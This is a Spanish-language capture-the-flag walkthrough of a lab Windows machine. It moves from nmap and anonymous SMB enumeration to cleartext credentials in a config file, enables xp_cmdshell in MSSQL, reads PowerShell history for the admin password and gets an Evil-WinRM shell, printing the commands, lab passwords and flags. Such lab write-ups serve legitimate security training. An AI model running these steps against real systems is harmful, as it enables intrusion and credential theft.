-----------------
- Tags: #protocols #MSSQL #SMB #PowerShell #Reconnaisance #remotecodeexecution #cleartextcredentials #informationdisclosure #anonymous 
----------
![](img/cbaa9aafd4ea0055f4920b8846d7b5f6%201.png)

![](img/ab45a6149bfc97382eb3f6e76e79668b.png)

## 🔍 Enumeración inicial

Empezaremos buscando cual puerto TCP tiene abierto un DB server.

![](img/a394e3b89709811bb175331b3d885bb3.png)

Haremos un nmap con los 1000 ports más importantes:

```bash
sudo nmap -sS --top-ports 1000 -Pn 10.129.116.211
```


![](img/22fd8b807f97a6fb3ae3c562a36be4f0.png)

✔️ Tenemos **SMB (445)** y **Microsoft SQL Server (1433)**.

## 📂 Enumeración de recursos compartidos SMB


Para la siguiente , nos piden:

![](img/37d5dac6fd49ddbda43f439866182924.png)

Buscaremos los recursos compartidos por Samba, accediendo anónimamente con smbclient:

Y vemos que encontramos un recurso compartido llamado "backups" .

```bash
smbclient -L //10.129.116.211 -N
```

**Recursos descubiertos**:

![](img/c571edc4adaafa0e54b95fe6c37642c4.png)

✅ Recurso útil: `backups`

## 📥 Acceso a backups y extracción de credenciales


Nos está pidiendo en la siguiente tarea, la contraseña del archivo de SMB:

![](img/0d70256c064d04d6ed6f4ee33028658f.png)

Lo montaremos, buscaremos el archivo correspondiente, y lo descargaremos en nuestra máquina.

```bash
smbclient //10.129.116.211/backups -N
```

![](img/940605540ac52d83ae3921e8971fe25b.png)

📦 Descargamos el archivo:

```bash
smb: \> get prod.dtsConfig
```

```bash
cat prod.dtsConfig
```

📌 **Credenciales encontradas**:

```bash
Password = M3g4c0rp123
USER ID  = ARCHETYPE\sql_svc
```

![](img/19f3229f51ad8aa53e81712661dcd035.png)


## 🛠 Acceso al SQL Server con impacket


![](img/dc8a4317b5c929e0bdfe707be59c1bb5.png)

Viendo estas tareas , nos tendremos que conectar con msqqclient.py (a SQL SERVER) con el usuario y la contraseña que hemos visto en el prod.dtsConfig:

Usaremos impacket-mssqlclient para conectarnos:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.116.211 -windows-auth
```

![](img/5669a9cd06a8fa16aea113c6291f78a1.png)

## ⚙️ Activación de xp_cmdshell

Se habilita `xp_cmdshell` para ejecutar comandos del sistema desde MSSQL:

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

![](img/6b787957d5056fae958ecb994eff5bd2.png)

🔧 Ahora podemos ejecutar comandos del sistema Windows desde SQL Server.

Una vez que **ejecutamos comandos en el sistema a través de `xp_cmdshell`**, el siguiente paso es **buscar información sensible**. Lo más valioso: contraseñas.

Como no podemos navegar con `ls` o `explorer`, pensamos como un atacante:

**Usuarios suelen guardar contraseñas en:**
    
    - Archivos `.txt`, `.ini`, `.config` en sus escritorios o documentos.
        
    - Scripts `.ps1`, `.bat`, `.vbs` usados en tareas automatizadas.
        
    - 🟩 **Historial de comandos escritos en PowerShell (como si fuera el `.bash_history` de Linux)**.


En esta tarea, dentro del servidor de SQL con el user, buscamos la flag:


![](img/212d00a063a3cf3829c5e915a77705e7.png)

## 🧪 Ejecución de comandos y búsqueda de la user flag

```bash
EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\Desktop\\user.txt';
```

![](img/ff10599eb048b2f27581b4dfd8a62c67.png)

✅ **Flag de usuario**:

*3e7b102e78218e935bf3f4951fec21a3*

### 📌 ¿Qué archivo guarda los comandos ejecutados en PowerShell?

👉 **`ConsoleHost_history.txt`**

Es un archivo que **guarda los últimos comandos escritos en PowerShell** por un usuario. Está en una ruta **por defecto**, dependiendo del usuario conectado:

`C:\\Users\\<usuario>\\AppData\\Roaming\\Microsoft\\Windows\PowerShell\\PSReadLine\\ConsoleHost_history.txt`

Ejectuaremos la ruta en cuestión:

```bash
EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt';
```

![](img/b3587853af6d58788ed830884695154a.png)

🔍 **Resultado**:

```bash
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

💥 ¡Aparece el comando que usó el admin con su contraseña! Porque el admin probablemente **hizo un `net use` con su contraseña escrita manualmente**, y eso **quedó registrado en ese historial**.

![](img/0172216fd155db1a187e5965736afec7.png)

## 🔐 Conexión como administrador (Evil-WinRM)

### 🎯 Objetivo:

Acceder al sistema Windows con **máximos privilegios (administrador)** para poder leer la flag de `root.txt`, ejecutar comandos críticos, y completar la post-explotación.

### 🧠 ¿Qué sabíamos hasta este punto?

1. Teníamos acceso limitado al sistema a través de `mssqlclient.py` (con usuario `sql_svc`).
    
2. A través del comando:

	EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'

descubrimos que **el administrador usó un comando `net use` con su propia contraseña** escrita a mano:

	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!



### 🛠️ ¿Qué es Evil-WinRM y por qué lo usamos?

**Evil-WinRM** es una herramienta que aprovecha el protocolo **WinRM (Windows Remote Management)** para obtener una shell interactiva en sistemas Windows **cuando tenemos credenciales válidas**.

🟩 Es la herramienta estándar para conectarse con credenciales válidas como `Administrator`.


### 🧪 Comando usado:

	evil-winrm -i (IP) -u administrator -p 'MEGACORP_4dm1n!!'

**Parámetros:**

- `-i`: Dirección IP de la máquina víctima.
    
- `-u`: Usuario válido (`administrator`).
    
- `-p`: Contraseña que obtuvimos desde `ConsoleHost_history.txt`.
    

✅ Resultado: Accedemos como `Administrator`, con shell PowerShell **completa y privilegiada**.

![](img/24b3f3547eb28b51f9f57431a8e909da.png)

```bash
evil-winrm -i 10.129.116.211 -u administrator -p 'MEGACORP_4dm1n!!'
```


![](img/13faa89ef7475923d909b62921259159.png)

## 📁 Exploración y obtención de la root flag

Una vez dentro, se puede hacer lo siguiente:

![](img/9575649081f8336284a16003f3809312.png)

✅ **Flag de root**:

*b91ccec3305e98240082d4474b848528*

Y así leer la flag final de la máquina (`root.txt`) y **confirmar que hemos comprometido completamente el sistema**.

### 🧩 ¿Por qué esta técnica es tan efectiva?

- Muchos administradores escriben contraseñas directamente en PowerShell.
    
- El historial **no se borra por defecto**.
    
- Si no usan seguridad adicional (BitLocker, historial encriptado...), ese archivo es **una mina de oro**.
    
- Usar `evil-winrm` **permite acceso total con esa contraseña** sin necesidad de exploits adicionales.


## ✅ Conclusión final

- Se descubrió un **servidor Microsoft SQL expuesto sin protección**, accesible vía SMB.
    
- Se extrajo un archivo `.dtsConfig` que contenía **credenciales en texto plano**.
    
- Se usó `impacket-mssqlclient` para ejecutar comandos en el sistema mediante `xp_cmdshell`.
    
- Se obtuvo acceso a **PowerShell history**, donde encontramos la contraseña del **usuario administrador**.
    
- Usando **Evil-WinRM**, conseguimos acceso completo al sistema y extraímos ambas flags.
    

🧠 **Lección aprendida**:  
Guardar contraseñas en scripts o archivos de configuración y no limpiar el historial de PowerShell puede suponer una brecha crítica. La herramienta `evil-winrm` demuestra su eficacia al permitir acceso remoto total con credenciales filtradas, sin necesidad de exploits.
